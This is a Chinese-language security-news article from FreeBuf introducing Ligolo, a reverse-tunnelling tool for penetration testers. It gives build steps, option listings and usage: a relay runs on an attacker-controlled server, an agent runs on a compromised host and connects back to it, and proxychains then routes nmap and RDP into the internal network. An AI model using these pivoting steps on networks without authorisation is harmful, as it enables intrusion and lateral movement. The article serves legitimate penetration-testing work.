![](https://image.3001.net/images/20200604/1591252253_5ed8951d434fd.png!small)

## Ligolo

**Ligolo是一款专为渗透测试人员设计的反向隧道工具。实际上，它是一款实现和使用都非常简单的轻量级工具，可以帮助渗透测试研究人员轻松通过一个反向连接建立一个完全安全的SOCKS5或TCP通信隧道。**

跟Meterpreter以及Autoroute + Socks4a相比，Ligolo的运行速度更快，并且更加稳定。

### 功能介绍

> 1、TLS 1.3隧道，带有TLS绑定；
>
> 2、多平台支持，包括Windows、Linux和macOS等；
>
> 3、多路复用（1条TCP连接可多路复用）；
>
> 4、SOCKS5代理或中继；

### 使用场景

假设你在一次外部安全审计任务过程中，现在已经成功入侵了一台Windows/Linux/macOS服务器。这台服务器位于目标组织的本地局域网络之中，而你想要与该网络内的其他主机建立通信连接。

那么此时，Ligolo就可以帮助你实现这个目标。它可以给我们建立一条通信随到并访问目标内部服务器的资源。4

## 工具演示

使用Proxychains (WAN)实现RDP通信连接中继。

### 工具性能

下面给出的图片是该工具在两台100MB/s主机之间的性能图，但实际情况需取决于目标系统和网络配置。

![speedtest.png](https://image.3001.net/images/20200604/1591252379_5ed8959b5eff3.png!small)

## 工具安装和使用

### 安装/编译

首先，请确保你的系统中已经安装了Go环境/工具。接下来，使用下列命令获取Ligolo项目远吗和相关依赖组件：

    
    
    cd `go env GOPATH`/src
    
    git clone <https://github.com/sysdream/ligolo>
    
    cd ligolo
    
    make dep

生成自签名的TLS证书，并存放至项目的`certs`目录之中：

    
    
    make certs TLS_HOST=example.com

当然了，你还可以通过`TLS_CERT`选项来使用你自己的TLS证书：

    
    
    make build-all TLS_CERT=certs/mycert.pem

最后，进行项目代码构建。

### 针对所有系统架构：

    
    
    make build-all

### 针对当前系统架构：

    
    
    make build

## 工具选项

### Localrelay选项：

    
    
    Usage of localrelay:
    
      -certfile string
    
        	The TLS server certificate (default "certs/server.crt")
    
      -keyfile string
    
        	The TLS server key (default "certs/server.key")
    
      -localserver string
    
        	The local server address (your proxychains parameter) (default "127.0.0.1:1080")
    
      -relayserver string
    
        	The relay server listening address (the connect-back address) (default "0.0.0.0:5555")

### Ligolo选项：

    
    
    Usage of ligolo:
    
      -autorestart
    
        	Attempt to reconnect in case of an exception
    
      -relayserver string
    
        	The relay server (the connect-back address) (default "127.0.0.1:5555")
    
      -skipverify
    
        	Skip TLS certificate pinning verification
    
      -targetserver string
    
        	The destination server (a RDP client, SSH server, etc.) - when not specified, Ligolo starts a socks5 proxy server

## 工具使用

Ligolo由下列两个模块组成：

> 1、 localrelay
>
> 2、 ligolo

Localrelay需要在攻击者控制的服务器端运行，Ligolo则需要在目标主机上运行。

对于localrelay，你可以直接使用默认选项，它将监听端口5555的所有接口，并等待来自ligolo的连接。

对于ligolo，你必须使用`-relayserver ip:port`参数的指定中继服务器的IP地址，也就是攻击者服务器的IP地址。

你可以使用-h选项查看工具的帮助命令。

Localrelay和ligolo之间的连接建立成功之后，工具会在中继服务器的TCP端口1080上设置一个SOCKS5代理，接下来你就可以使用你喜欢的工具来渗透目标的LAN网络了。

在攻击者服务器端，运行下列命令：

    
    
    ./bin/localrelay_linux_amd64

在目标主机中，运行下列命令：

    
    
    > ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555

一旦通信连接建立成功，请在`ProxyChains`的配置文件中设置下列参数（在攻击者服务器端）：

    
    
    [ProxyList]
    
    # add proxy here ...
    
    # meanwile
    
    # defaults set to "tor"
    
    socks5     127.0.0.1 1080

最后：

    
    
    $ proxychains nmap -sT 10.0.0.0/24 -p 80 -Pn -A
    
    $ proxychains rdesktop 10.0.0.123

## 许可证协议

Ligolo项目的开发与发布遵循GNU General Public License v3.0开源许可证协议。

## 项目地址

Ligolo：【[GitHub传送门](https://github.com/sysdream/ligolo)】

 ***
参考来源：[sysdream](https://github.com/sysdream/ligolo)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

